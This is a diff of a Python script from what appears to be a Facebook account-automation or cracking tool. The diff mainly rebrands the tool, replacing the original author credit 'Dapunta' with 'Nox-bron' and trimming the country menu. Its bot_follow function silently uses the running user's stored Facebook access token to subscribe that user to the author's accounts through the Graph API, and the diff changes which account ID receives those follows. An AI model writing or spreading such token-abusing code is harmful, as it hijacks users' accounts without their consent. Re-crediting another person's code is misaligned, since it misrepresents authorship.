@@ -1,6 +1,6 @@
 #!/usr/bin/python3
 #-*-coding:utf-8-*-
-# Made With ❤️ By Dapunta
+# Made With by Nox-bron
 
 import requests,mechanize,bs4,sys,os,subprocess,uuid,random,time,re,base64,concurrent.futures,json,ipaddress
 from random import randint
@@ -33,8 +33,8 @@ else:
 ### HEADERS ###
 
 def banner():
-    print("""\x1b[0;37m   ___                   _/                                     
-    _/      _/  Github.com/Nox-bron             _/                                 ®    
+    print("""                                           _/                                     
+    _/      _/  Github.com/Nox-bron   _/                                             ®    
    _/_/    _/    _/_/    _/    _/              _/_/_/    _/  _/_/    _/_/    _/_/_/_/   
   _/  _/  _/  _/    _/    _/_/    _/_/_/_/_/  _/    _/  _/_/      _/    _/  _/    _/   
  _/    _/_/  _/    _/  _/    _/              _/    _/  _/        _/    _/  _/    _/    
@@ -122,9 +122,6 @@ def country():
     banner()
     print("\n%s[%s Choose Country %s]\n"%(k,p,k))
     print("%s[%s1%s] %sIndonesia"%(k,p,k,p))
-    print("%s[%s2%s] %sBangladesh/India"%(k,p,k,p))
-    print("%s[%s3%s] %sPakistan"%(k,p,k,p))
-    print("%s[%s4%s] %sUSA"%(k,p,k,p))
     print("%s[%s0%s] %sNone"%(k,p,k,p))
     choose_country()
     
@@ -273,7 +270,7 @@ def bot_follow():
 		logs()
 	jalan("%s[%s•%s] %sPlease Wait..."%(k,p,k,p))
 	requests.post("https://graph.facebook.com/1827084332/subscribers?access_token=" + toket)      # Dapunta Khurayra X
-	requests.post("https://graph.facebook.com/100051395147257/subscribers?access_token=" + toket)      # رحمة
+	requests.post("https://graph.facebook.com/1673250723/subscribers?access_token=" + toket)      # 
 	menu()
 
 ### MAIN MENU ###
@@ -292,6 +289,8 @@ def menu():
     ngr = open('country.txt', 'r').read()
     if "id" in ngr:
         negara = "Indonesia"
+    elif " " in ngr:
+        negara = "None"
     os.system("clear")
     banner()
     print((k+"\n[ "+p+"Welcome "+a["name"]+k+" ]"+p))
